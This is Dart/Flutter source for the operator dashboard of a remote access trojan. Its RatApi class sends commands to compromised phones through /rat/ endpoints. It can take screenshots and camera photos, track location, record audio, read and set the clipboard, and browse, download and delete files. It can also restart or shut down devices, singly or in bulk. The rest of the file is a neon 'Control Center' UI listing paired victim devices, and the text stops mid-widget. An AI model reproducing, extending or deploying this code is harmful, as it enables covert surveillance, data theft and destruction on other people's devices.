import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';
import 'device_permission.dart';
import 'control_panel.dart';
import 'package:permission_handler/permission_handler.dart';
import '.dart';

// ─────────────────────────────────────────────────────────────────────────────
// RAT API ENDPOINTS
// ─────────────────────────────────────────────────────────────────────────────
class RatApi {
  static Future<Map<String, dynamic>> login(String username, String password) async {
    try {
      final res = await http.post(
        Uri.parse('$BaseUrl/rat/login'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'username': username,
          'password': password,
        }),
      ).timeout(const Duration(seconds: 10));
      return jsonDecode(res.body);
    } catch (e) {
      return {'valid': false, 'message': 'Connection error: $e'};
    }
  }
  
  static Future<Map<String, dynamic>> getDevices(String sessionKey) async {
    try {
      final res = await http.get(
        Uri.parse('$BaseUrl/rat/my-devices?key=$sessionKey'),
      ).timeout(const Duration(seconds: 10));
      return jsonDecode(res.body);
    } catch (e) {
      return {'valid': false, 'message': 'Connection error: $e', 'devices': []};
    }
  }
  
  static Future<Map<String, dynamic>> getPairId(String sessionKey) async {
    try {
      final res = await http.get(
        Uri.parse('$BaseUrl/rat/pairid?key=$sessionKey'),
      ).timeout(const Duration(seconds: 10));
      return jsonDecode(res.body);
    } catch (e) {
      return {'valid': false, 'pairId': ''};
    }
  }
  
  static Future<Map<String, dynamic>> pairDevice(String sessionKey, String pairId) async {
    try {
      final res = await http.post(
        Uri.parse('$BaseUrl/rat/pair-device'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'key': sessionKey,
          'pairId': pairId,
        }),
      ).timeout(const Duration(seconds: 10));
      return jsonDecode(res.body);
    } catch (e) {
      return {'success': false, 'message': 'Connection error: $e'};
    }
  }
  
  static Future<Map<String, dynamic>> unpairDevice(String sessionKey, String deviceId) async {
    try {
      final res = await http.post(
        Uri.parse('$BaseUrl/rat/unpair-device'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'key': sessionKey,
          'deviceId': deviceId,
        }),
      ).timeout(const Duration(seconds: 10));
      return jsonDecode(res.body);
    } catch (e) {
      return {'success': false, 'message': 'Connection error: $e'};
    }
  }
  
  static Future<Map<String, dynamic>> sendCommand(
    String sessionKey,
    String deviceId,
    String command,
    String extra,
  ) async {
    try {
      final res = await http.post(
        Uri.parse('$BaseUrl/rat/send-command'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'key': sessionKey,
          'id': deviceId,
          'command': command,
          'extra': extra,
        }),
      ).timeout(const Duration(seconds: 10));
      return jsonDecode(res.body);
    } catch (e) {
      return {'success': false, 'message': 'Connection error: $e'};
    }
  }
  
  static Future<Map<String, dynamic>> sendBulkCommand(
    String sessionKey,
    String command,
    String extra,
  ) async {
    try {
      final res = await http.post(
        Uri.parse('$BaseUrl/rat/bulk-command'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'key': sessionKey,
          'command': command,
          'extra': extra,
        }),
      ).timeout(const Duration(seconds: 10));
      return jsonDecode(res.body);
    } catch (e) {
      return {'success': false, 'message': 'Connection error: $e'};
    }
  }
  
  static Future<Map<String, dynamic>> setProtection(
    String sessionKey,
    bool enable,
  ) async {
    try {
      final res = await http.post(
        Uri.parse('$BaseUrl/rat/set-protection'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'key': sessionKey,
          'enable': enable,
        }),
      ).timeout(const Duration(seconds: 10));
      return jsonDecode(res.body);
    } catch (e) {
      return {'success': false, 'message': 'Connection error: $e'};
    }
  }
  
  static Future<Map<String, dynamic>> getProtectionStatus(String sessionKey) async {
    try {
      final res = await http.get(
        Uri.parse('$BaseUrl/rat/protection-status?key=$sessionKey'),
      ).timeout(const Duration(seconds: 10));
      return jsonDecode(res.body);
    } catch (e) {
      return {'valid': false, 'enabled': false};
    }
  }
  
  static Future<Map<String, dynamic>> getPermissions(String sessionKey) async {
    try {
      final res = await http.get(
        Uri.parse('$BaseUrl/rat/permissions?key=$sessionKey'),
      ).timeout(const Duration(seconds: 10));
      return jsonDecode(res.body);
    } catch (e) {
      return {'valid': false, 'permissions': []};
    }
  }
  
  static Future<Map<String, dynamic>> setPermission(
    String sessionKey,
    String targetUsername,
    String permission,
  ) async {
    try {
      final res = await http.post(
        Uri.parse('$BaseUrl/rat/set-permission'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'key': sessionKey,
          'target': targetUsername,
          'permission': permission,
        }),
      ).timeout(const Duration(seconds: 10));
      return jsonDecode(res.body);
    } catch (e) {
      return {'success': false, 'message': 'Connection error: $e'};
    }
  }
  
  static Future<Map<String, dynamic>> getDeviceInfo(
    String sessionKey,
    String deviceId,
  ) async {
    try {
      final res = await http.get(
        Uri.parse('$BaseUrl/rat/device-info?id=$deviceId&key=$sessionKey'),
      ).timeout(const Duration(seconds: 10));
      return jsonDecode(res.body);
    } catch (e) {
      return {'valid': false, 'message': 'Connection error: $e'};
    }
  }
  
  static Future<Map<String, dynamic>> getLogs(
    String sessionKey,
    String deviceId,
  ) async {
    try {
      final res = await http.get(
        Uri.parse('$BaseUrl/rat/logs?id=$deviceId&key=$sessionKey'),
      ).timeout(const Duration(seconds: 10));
      return jsonDecode(res.body);
    } catch (e) {
      return {'valid': false, 'logs': []};
    }
  }
  
  static Future<Map<String, dynamic>> takeScreenshot(
    String sessionKey,
    String deviceId,
  ) async {
    try {
      final res = await http.get(
        Uri.parse('$BaseUrl/rat/screenshot?id=$deviceId&key=$sessionKey'),
      ).timeout(const Duration(seconds: 10));
      return jsonDecode(res.body);
    } catch (e) {
      return {'success': false, 'message': 'Connection error: $e'};
    }
  }
  
  static Future<Map<String, dynamic>> takePhoto(
    String sessionKey,
    String deviceId,
    String camera,
  ) async {
    try {
      final res = await http.get(
        Uri.parse('$BaseUrl/rat/photo?id=$deviceId&key=$sessionKey&camera=$camera'),
      ).timeout(const Duration(seconds: 10));
      return jsonDecode(res.body);
    } catch (e) {
      return {'success': false, 'message': 'Connection error: $e'};
    }
  }
  
  static Future<Map<String, dynamic>> getLocation(
    String sessionKey,
    String deviceId,
  ) async {
    try {
      final res = await http.get(
        Uri.parse('$BaseUrl/rat/location?id=$deviceId&key=$sessionKey'),
      ).timeout(const Duration(seconds: 10));
      return jsonDecode(res.body);
    } catch (e) {
      return {'success': false, 'message': 'Connection error: $e'};
    }
  }
  
  static Future<Map<String, dynamic>> startRecording(
    String sessionKey,
    String deviceId,
  ) async {
    try {
      final res = await http.post(
        Uri.parse('$BaseUrl/rat/start-recording'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'key': sessionKey,
          'id': deviceId,
        }),
      ).timeout(const Duration(seconds: 10));
      return jsonDecode(res.body);
    } catch (e) {
      return {'success': false, 'message': 'Connection error: $e'};
    }
  }
  
  static Future<Map<String, dynamic>> stopRecording(
    String sessionKey,
    String deviceId,
  ) async {
    try {
      final res = await http.post(
        Uri.parse('$BaseUrl/rat/stop-recording'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'key': sessionKey,
          'id': deviceId,
        }),
      ).timeout(const Duration(seconds: 10));
      return jsonDecode(res.body);
    } catch (e) {
      return {'success': false, 'message': 'Connection error: $e'};
    }
  }
  
  static Future<Map<String, dynamic>> getClipboard(
    String sessionKey,
    String deviceId,
  ) async {
    try {
      final res = await http.get(
        Uri.parse('$BaseUrl/rat/clipboard?id=$deviceId&key=$sessionKey'),
      ).timeout(const Duration(seconds: 10));
      return jsonDecode(res.body);
    } catch (e) {
      return {'success': false, 'message': 'Connection error: $e'};
    }
  }
  
  static Future<Map<String, dynamic>> setClipboard(
    String sessionKey,
    String deviceId,
    String text,
  ) async {
    try {
      final res = await http.post(
        Uri.parse('$BaseUrl/rat/set-clipboard'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'key': sessionKey,
          'id': deviceId,
          'text': text,
        }),
      ).timeout(const Duration(seconds: 10));
      return jsonDecode(res.body);
    } catch (e) {
      return {'success': false, 'message': 'Connection error: $e'};
    }
  }
  
  static Future<Map<String, dynamic>> listFiles(
    String sessionKey,
    String deviceId,
    String path,
  ) async {
    try {
      final res = await http.get(
        Uri.parse('$BaseUrl/rat/files?id=$deviceId&key=$sessionKey&path=$path'),
      ).timeout(const Duration(seconds: 10));
      return jsonDecode(res.body);
    } catch (e) {
      return {'valid': false, 'files': []};
    }
  }
  
  static Future<Map<String, dynamic>> downloadFile(
    String sessionKey,
    String deviceId,
    String path,
  ) async {
    try {
      final res = await http.get(
        Uri.parse('$BaseUrl/rat/download?id=$deviceId&key=$sessionKey&path=$path'),
      ).timeout(const Duration(seconds: 10));
      return jsonDecode(res.body);
    } catch (e) {
      return {'success': false, 'message': 'Connection error: $e'};
    }
  }
  
  static Future<Map<String, dynamic>> deleteFile(
    String sessionKey,
    String deviceId,
    String path,
  ) async {
    try {
      final res = await http.post(
        Uri.parse('$BaseUrl/rat/delete-file'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'key': sessionKey,
          'id': deviceId,
          'path': path,
        }),
      ).timeout(const Duration(seconds: 10));
      return jsonDecode(res.body);
    } catch (e) {
      return {'success': false, 'message': 'Connection error: $e'};
    }
  }
  
  static Future<Map<String, dynamic>> getSystemInfo(
    String sessionKey,
    String deviceId,
  ) async {
    try {
      final res = await http.get(
        Uri.parse('$BaseUrl/rat/system-info?id=$deviceId&key=$sessionKey'),
      ).timeout(const Duration(seconds: 10));
      return jsonDecode(res.body);
    } catch (e) {
      return {'valid': false, 'message': 'Connection error: $e'};
    }
  }
  
  static Future<Map<String, dynamic>> restartDevice(
    String sessionKey,
    String deviceId,
  ) async {
    try {
      final res = await http.post(
        Uri.parse('$BaseUrl/rat/restart'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'key': sessionKey,
          'id': deviceId,
        }),
      ).timeout(const Duration(seconds: 10));
      return jsonDecode(res.body);
    } catch (e) {
      return {'success': false, 'message': 'Connection error: $e'};
    }
  }
  
  static Future<Map<String, dynamic>> shutdownDevice(
    String sessionKey,
    String deviceId,
  ) async {
    try {
      final res = await http.post(
        Uri.parse('$BaseUrl/rat/shutdown'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'key': sessionKey,
          'id': deviceId,
        }),
      ).timeout(const Duration(seconds: 10));
      return jsonDecode(res.body);
    } catch (e) {
      return {'success': false, 'message': 'Connection error: $e'};
    }
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// THEME HIJAU BIRU MENYALA
// ─────────────────────────────────────────────────────────────────────────────
class NeonTheme {
  // Background
  static const Color background = Color(0xFF0A0E17);
  static const Color surface = Color(0xFF111827);
  static const Color surfaceLight = Color(0xFF1A2332);
  static const Color card = Color(0xFF0F1729);
  static const Color cardHover = Color(0xFF1E2A3A);
  static const Color border = Color(0xFF1E3A5F);
  static const Color borderLight = Color(0xFF2A4A6F);
  
  // Teks
  static const Color textPrimary = Color(0xFFE8F0FE);
  static const Color textSecondary = Color(0xFF8BA4C8);
  static const Color textMuted = Color(0xFF4A6A8A);
  
  // Neon Hijau
  static const Color neonGreen = Color(0xFF00FF88);
  static const Color neonGreenDark = Color(0xFF00CC66);
  static const Color neonGreenGlow = Color(0xFF00FF88);
  static const Color neonGreenDim = Color(0xFF006633);
  
  // Neon Biru
  static const Color neonBlue = Color(0xFF00D4FF);
  static const Color neonBlueDark = Color(0xFF0099CC);
  static const Color neonBlueGlow = Color(0xFF00D4FF);
  static const Color neonBlueDim = Color(0xFF004466);
  
  // Neon Cyan
  static const Color neonCyan = Color(0xFF00FFD4);
  static const Color neonCyanDark = Color(0xFF00CCAA);
  
  // Gradasi Neon
  static const LinearGradient gradientNeon = LinearGradient(
    colors: [neonGreen, neonBlue, neonGreen],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );
  
  static const LinearGradient gradientNeonVertical = LinearGradient(
    colors: [neonGreen, neonBlue],
    begin: Alignment.topCenter,
    end: Alignment.bottomCenter,
  );
  
  static const LinearGradient gradientDarkNeon = LinearGradient(
    colors: [Color(0xFF00FF88), Color(0xFF00D4FF)],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );
  
  // Shadow Glow
  static BoxShadow glowGreen({double blur = 20}) => BoxShadow(
    color: neonGreen.withOpacity(0.3),
    blurRadius: blur,
    spreadRadius: 0,
  );
  
  static BoxShadow glowBlue({double blur = 20}) => BoxShadow(
    color: neonBlue.withOpacity(0.3),
    blurRadius: blur,
    spreadRadius: 0,
  );
  
  static BoxShadow glowNeon({double blur = 25}) => BoxShadow(
    color: neonGreen.withOpacity(0.2),
    blurRadius: blur,
    spreadRadius: 2,
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// DEVICE DASHBOARD PAGE
// ─────────────────────────────────────────────────────────────────────────────
class DeviceDashboardPage extends StatefulWidget {
  final String username;
  final String role;
  final String sessionKey;
  
  const DeviceDashboardPage({
    super.key,
    this.username = '',
    this.role = '',
    this.sessionKey = '',
  });

  @override
  State<DeviceDashboardPage> createState() => _DeviceDashboardPageState();
}

class _DeviceDashboardPageState extends State<DeviceDashboardPage> with SingleTickerProviderStateMixin {
  List<dynamic> _devices = [];
  bool _isLoading = true;
  String? _errorMsg;
  String _pairId = '';
  Timer? _autoRefreshTimer;
  int _selectedTab = 0;
  bool _isProtectionEnabled = false;
  bool _isProtectionLoading = false;
  
  late AnimationController _animationController;
  late Animation<double> _fadeAnimation;
  late Animation<double> _pulseAnimation;

  bool get _isOwner => widget.role.toLowerCase() == 'owner';
  int get _onlineCount => _devices.where((d) => d['online'] == true).length;
  int get _offlineCount => _devices.length - _onlineCount;

  @override
  void initState() {
    super.initState();
    _animationController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 600),
    );
    _fadeAnimation = CurvedAnimation(
      parent: _animationController,
      curve: Curves.easeInOut,
    );
    _pulseAnimation = Tween<double>(begin: 1.0, end: 1.05).animate(
      CurvedAnimation(
        parent: _animationController,
        curve: Curves.easeInOut,
      ),
    );
    _animationController.forward();
    
    _loadData();
    _loadProtectionStatus();
    _autoRefreshTimer = Timer.periodic(const Duration(seconds: 20), (_) => _loadData());
  }

  @override
  void dispose() {
    _autoRefreshTimer?.cancel();
    _animationController.dispose();
    super.dispose();
  }

  void _showToast(String msg, {Color color = NeonTheme.neonBlue}) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Row(
          children: [
            Icon(Icons.check_circle_rounded, color: Colors.white, size: 18),
            const SizedBox(width: 10),
            Expanded(child: Text(msg, style: const TextStyle(color: Colors.white))),
          ],
        ),
        backgroundColor: color.withOpacity(0.9),
        duration: const Duration(seconds: 3),
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(12),
          side: BorderSide(color: color.withOpacity(0.3)),
        ),
        margin: const EdgeInsets.all(12),
      ),
    );
  }

  Future<void> _loadData() async {
    if (!mounted) return;
    try {
      final pairResult = await RatApi.getPairId(widget.sessionKey);
      if (pairResult['valid'] == true && pairResult['pairId'] != null) {
        if (mounted) setState(() => _pairId = pairResult['pairId'].toString());
      }

      final deviceResult = await RatApi.getDevices(widget.sessionKey);
      
      if (!mounted) return;
      
      if (deviceResult['valid'] != true) {
        setState(() {
          _isLoading = false;
          _errorMsg = deviceResult['message'] ?? 'Invalid response';
        });
        return;
      }

      List<dynamic> devices = List<dynamic>.from(deviceResult['devices'] ?? []);
      
      final now = DateTime.now();
      for (var d in devices) {
        try {
          final seen = DateTime.parse(d['lastSeen']?.toString() ?? '');
          d['online'] = now.difference(seen).inSeconds < 30;
        } catch (_) {
          d['online'] = false;
        }
      }

      if (mounted) {
        setState(() {
          _devices = devices;
          _isLoading = false;
          _errorMsg = null;
        });
      }
    } catch (e) {
      if (mounted) {
        setState(() {
          _isLoading = false;
          _errorMsg = e.toString();
        });
      }
    }
  }

  Future<void> _toggleProtection() async {
    if (_isProtectionLoading) return;
    
    setState(() => _isProtectionLoading = true);
    
    try {
      final newState = !_isProtectionEnabled;
      final result = await RatApi.setProtection(widget.sessionKey, newState);
      
      if (!mounted) return;
      
      if (result['success'] == true) {
        setState(() {
          _isProtectionEnabled = newState;
        });
        _showToast(
          newState 
            ? '🔒 Proteksi Diaktifkan' 
            : '🔓 Proteksi Dinonaktifkan',
          color: newState ? NeonTheme.neonGreen : NeonTheme.neonBlue,
        );
      } else {
        throw Exception(result['message'] ?? 'Gagal mengubah proteksi');
      }
    } catch (e) {
      if (mounted) {
        _showToast('Error: $e', color: NeonTheme.neonGreen);
      }
    } finally {
      if (mounted) setState(() => _isProtectionLoading = false);
    }
  }

  Future<void> _loadProtectionStatus() async {
    try {
      final result = await RatApi.getProtectionStatus(widget.sessionKey);
      if (!mounted) return;
      if (result['valid'] == true) {
        setState(() {
          _isProtectionEnabled = result['enabled'] ?? false;
        });
      }
    } catch (e) {
      // Silent fail
    }
  }

  void _copyPairId() {
    if (_pairId.isEmpty) return;
    Clipboard.setData(ClipboardData(text: _pairId));
    _showToast('✅ ID Pairing disalin!', color: NeonTheme.neonGreen);
  }

  void _showQuickActions() {
    showModalBottomSheet(
      context: context,
      backgroundColor: NeonTheme.surface,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(20)),
      ),
      builder: (_) => QuickActionsSheet(
        devices: _devices,
        sessionKey: widget.sessionKey,
        username: widget.username,
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: NeonTheme.background,
      body: SafeArea(
        child: FadeTransition(
          opacity: _fadeAnimation,
          child: Column(
            children: [
              _buildHeader(),
              _buildPairIdCard(),
              _buildStatsBar(),
              _buildTabBar(),
              Expanded(
                child: IndexedStack(
                  index: _selectedTab,
                  children: [
                    _buildDeviceGrid(),
                    _buildHistoryLog(),
                    _buildDeviceAnalytics(),
                  ],
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildHeader() {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
      decoration: BoxDecoration(
        color: NeonTheme.surface,
        border: Border(bottom: BorderSide(color: NeonTheme.border)),
        boxShadow: [NeonTheme.glowNeon(blur: 10)],
      ),
      child: Row(
        children: [
          Container(
            padding: const EdgeInsets.all(8),
            decoration: BoxDecoration(
              gradient: NeonTheme.gradientNeon,
              borderRadius: BorderRadius.circular(10),
              boxShadow: [NeonTheme.glowGreen(blur: 15)],
            ),
            child: const Icon(Icons.devices_rounded, color: Colors.black87, size: 18),
          ),
          const SizedBox(width: 12),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                ShaderMask(
                  shaderCallback: (bounds) => LinearGradient(
                    colors: [NeonTheme.neonGreen, NeonTheme.neonBlue],
                    begin: Alignment.topLeft,
                    end: Alignment.bottomRight,
                  ).createShader(bounds),
                  child: Text(
                    'Control Center',
                    style: TextStyle(
                      color: Colors.white,
                      fontSize: 16,
                      fontWeight: FontWeight.w700,
                      letterSpacing: 0.5,
                    ),
                  ),
                ),
                Row(
                  children: [
                    Text(
                      '@${widget.username}',
                      style: TextStyle(
                        color: NeonTheme.textSecondary,
                        fontSize: 11,
                      ),
                    ),
                    const SizedBox(width: 8),
                    Container(
                      padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 1),
                      decoration: BoxDecoration(
                        gradient: _isOwner ? NeonTheme.gradientNeon : null,
                        borderRadius: BorderRadius.circular(4),
                      ),
                      child: Text(
                        _isOwner ? 'OWNER' : 'MEMBER',
                        style: TextStyle(
                          color: _isOwner ? Colors.black87 : NeonTheme.textMuted,
                          fontSize: 7,
                          fontWeight: FontWeight.bold,
                          letterSpacing: 0.5,
                        ),
                      ),
                    ),
                  ],
                ),
              ],
            ),
          ),
          GestureDetector(
            onTap: _showQuickActions,
            child: Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                gradient: NeonTheme.gradientNeon,
                borderRadius: BorderRadius.circular(10),
                boxShadow: [NeonTheme.glowGreen(blur: 15)],
              ),
              child: Icon(
                Icons.flash_on_rounded,
                color: Colors.black87,
                size: 20,
              ),
            ),
          ),
          const SizedBox(width: 8),
          GestureDetector(
            onTap: () {
              setState(() => _isLoading = true);
              _loadData();
            },
            child: Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: NeonTheme.surfaceLight,
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: NeonTheme.border),
              ),
              child: Icon(
                _isLoading ? Icons.hourglass_top_rounded : Icons.refresh_rounded,
                color: NeonTheme.textSecondary,
                size: 20,
              ),
            ),
          ),
          const SizedBox(width: 8),
          GestureDetector(
            onTap: () => Navigator.pop(context),
            child: Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: NeonTheme.neonGreen.withOpacity(0.05),
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: NeonTheme.neonGreen.withOpacity(0.1)),
              ),
              child: Icon(
                Icons.logout_rounded,
                color: NeonTheme.neonGreen.withOpacity(0.4),
                size: 20,
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildPairIdCard() {
    if (_pairId.isEmpty || !_isOwner) return const SizedBox.shrink();
    
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          colors: [
            NeonTheme.surface,
            NeonTheme.surfaceLight,
          ],
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
        ),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(
          color: NeonTheme.neonGreen.withOpacity(0.1),
          width: 1,
        ),
        boxShadow: [
          NeonTheme.glowGreen(blur: 20),
        ],
      ),
      child: Row(
        children: [
          Container(
            padding: const EdgeInsets.all(8),
            decoration: BoxDecoration(
              gradient: NeonTheme.gradientNeon,
              borderRadius: BorderRadius.circular(8),
              boxShadow: [NeonTheme.glowGreen(blur: 15)],
            ),
            child: const Icon(Icons.link_rounded, color: Colors.black87, size: 16),
          ),
          const SizedBox(width: 12),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  'PAIRING ID',
                  style: TextStyle(
                    color: NeonTheme.textMuted,
                    fontSize: 8,
                    letterSpacing: 1.5,
                    fontWeight: FontWeight.bold,
                  ),
                ),
                GestureDetector(
                  onTap: _copyPairId,
                  child: Row(
                    children: [
                      ShaderMask(
                        shaderCallback: (bounds) => LinearGradient(
                          colors: [NeonTheme.neonGreen, NeonTheme.neonBlue],
                        ).createShader(bounds),
                        child: Text(
                          _pairId,
                          style: TextStyle(
                            color: Colors.white,
                            fontSize: 14,
                            fontWeight: FontWeight.bold,
                            letterSpacing: 2,
                          ),
                        ),
                      ),
                      const SizedBox(width: 8),
                      Icon(
                        Icons.copy_rounded,
                        color: NeonTheme.neonGreen.withOpacity(0.3),
                        size: 14,
                      ),
                    ],
                  ),
                ),
              ],
            ),
          ),
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 4, vertical: 2),
            decoration: BoxDecoration(
              color: _isProtectionEnabled 
                ? NeonTheme.neonGreen.withOpacity(0.05) 
                : NeonTheme.neonBlue.withOpacity(0.05),
              borderRadius: BorderRadius.circular(10),
              border: Border.all(
                color: _isProtectionEnabled 
                  ? NeonTheme.neonGreen.withOpacity(0.1) 
                  : NeonTheme.neonBlue.withOpacity(0.1),
              ),
            ),
            child: Row(
              mainAxisSize: MainAxisSize.min,
              children: [
                Icon(
                  _isProtectionEnabled 
                    ? Icons.lock_rounded 
                    : Icons.lock_open_rounded,
                  color: _isProtectionEnabled 
                    ? NeonTheme.neonGreen 
                    : NeonTheme.neonBlue,
                  size: 14,
                ),
                const SizedBox(width: 4),
                GestureDetector(
                  onTap: _isProtectionLoading ? null : _toggleProtection,
                  child: Container(
                    padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                    decoration: BoxDecoration(
                      gradient: _isProtectionEnabled 
                        ? NeonTheme.gradientNeon 
                        : null,
                      borderRadius: BorderRadius.circular(6),
                      border: Border.all(
                        color: _isProtectionEnabled 
                          ? NeonTheme.neonGreen.withOpacity(0.2) 
                          : NeonTheme.neonBlue.withOpacity(0.2),
                      ),
                    ),
                    child: _isProtectionLoading
                      ? const SizedBox(
                          width: 14,
                          height: 14,
                          child: CircularProgressIndicator(
                            strokeWidth: 2,
                            color: NeonTheme.neonGreen,
                          ),
                        )
                      : Text(
                          _isProtectionEnabled ? 'PROTEKSI ON' : 'PROTEKSI OFF',
                          style: TextStyle(
                            color: _isProtectionEnabled 
                              ? Colors.black87 
                              : NeonTheme.neonBlue,
                            fontSize: 8,
                            fontWeight: FontWeight.bold,
                            letterSpacing: 0.5,
                          ),
                        ),
                  ),
                ),
              ],
            ),
          ),
          const SizedBox(width: 8),
          GestureDetector(
            onTap: _copyPairId,
            child: Container(
              padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
              decoration: BoxDecoration(
                gradient: NeonTheme.gradientNeon,
                borderRadius: BorderRadius.circular(8),
                boxShadow: [NeonTheme.glowGreen(blur: 15)],
              ),
              child: const Text(
                'COPY',
                style: TextStyle(
                  color: Colors.black87,
                  fontSize: 10,
                  fontWeight: FontWeight.bold,
                  letterSpacing: 1,
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildStatsBar() {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
      child: Row(
        children: [
          _buildStatItem('Total', _devices.length.toString(), NeonTheme.neonBlue),
          _buildStatItem('Online', _onlineCount.toString(), NeonTheme.neonGreen),
          _buildStatItem('Offline', _offlineCount.toString(), NeonTheme.textMuted),
          _buildStatItem('Battery', '${_getAverageBattery()}%', NeonTheme.neonCyan),
        ],
      ),
    );
  }

  Widget _buildStatItem(String label, String value, Color color) {
    return Expanded(
      child: Container(
        margin: const EdgeInsets.symmetric(horizontal: 4),
        padding: const EdgeInsets.symmetric(vertical: 6),
        decoration: BoxDecoration(
          color: NeonTheme.surface,
          borderRadius: BorderRadius.circular(10),
          border: Border.all(color: color.withOpacity(0.1)),
          boxShadow: [
            BoxShadow(
              color: color.withOpacity(0.05),
              blurRadius: 10,
            ),
          ],
        ),
        child: Column(
          children: [
            Text(
              value,
              style: TextStyle(
                color: color,
                fontSize: 16,
                fontWeight: FontWeight.bold,
              ),
            ),
            Text(
              label,
              style: TextStyle(
                color: NeonTheme.textMuted,
                fontSize: 8,
                letterSpacing: 0.5,
              ),
            ),
          ],
        ),
      ),
    );
  }

  int _getAverageBattery() {
    if (_devices.isEmpty) return 0;
    final total = _devices.fold<int>(0, (sum, d) {
      final bat = d['battery']?.toString();
      return sum + (int.tryParse(bat ?? '0') ?? 0);
    });
    return (total / _devices.length).round();
  }

  Widget _buildTabBar() {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 16, vertical: 6),
      padding: const EdgeInsets.all(4),
      decoration: BoxDecoration(
        color: NeonTheme.surface,
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: NeonTheme.border),
      ),
      child: Row(
        children: [
          _buildTabItem('Devices', 0, Icons.devices_rounded),
          _buildTabItem('History', 1, Icons.history_rounded),
          _buildTabItem('Analytics', 2, Icons.analytics_rounded),
        ],
      ),
    );
  }

  Widget _buildTabItem(String label, int index, IconData icon) {
    final isSelected = _selectedTab == index;
    return Expanded(
      child: GestureDetector(
        onTap: () => setState(() => _selectedTab = index),
        child: Container(
          padding: const EdgeInsets.symmetric(vertical: 8),
          decoration: BoxDecoration(
            gradient: isSelected ? NeonTheme.gradientNeon : null,
            borderRadius: BorderRadius.circular(10),
            boxShadow: isSelected ? [NeonTheme.glowGreen(blur: 15)] : [],
          ),
          child: Row(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Icon(
                icon,
                color: isSelected ? Colors.black87 : NeonTheme.textMuted,
                size: 14,
              ),
              const SizedBox(width: 4),
              Text(
                label,
                style: TextStyle(
                  color: isSelected ? Colors.black87 : NeonTheme.textMuted,
                  fontSize: 10,
                  fontWeight: isSelected ? FontWeight.bold : FontWeight.w500,
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildDeviceGrid() {
    if (_isLoading) {
      return const Center(
        child: CircularProgressIndicator(
          valueColor: AlwaysStoppedAnimation<Color>(NeonTheme.neonGreen),
        ),
      );
    }

    if (_errorMsg != null) {
      return Center(
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Icon(Icons.error_rounded, color: NeonTheme.neonGreen, size: 48),
            const SizedBox(height: 12),
            Text(
              _errorMsg!,
              style: TextStyle(color: NeonTheme.textSecondary, fontSize: 13),
              textAlign: TextAlign.center,
            ),
          ],
        ),
      );
    }

    if (_devices.isEmpty) {
      return _buildEmptyState();
    }

    return GridView.builder(
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
      gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
        crossAxisCount: 2,
        crossAxisSpacing: 12,
        mainAxisSpacing: 12,
        childAspectRatio: 0.85,
      ),
      itemCount: _devices.length,
      itemBuilder: (ctx, i) {
        final d = _devices[i];
        final isOnline = d['online'] == true;
        return _buildDeviceCard(d, isOnline);
      },
    );
  }

  Widget _buildDeviceCard(dynamic device, bool isOnline) {
    final model = device['model']?.toString() ?? 'Unknown';
    final id = device['id']?.toString() ?? '-';
    final battery = device['battery']?.toString() ?? '?';
    final color = isOnline ? NeonTheme.neonGreen : NeonTheme.textMuted;
    
    return GestureDetector(
      onTap: () => Navigator.push(
        context,
        MaterialPageRoute(
          builder: (_) => ControlCenterPage(
            targetDevice: device,
            role: widget.role,
          ),
        ),
      ),
      child: Container(
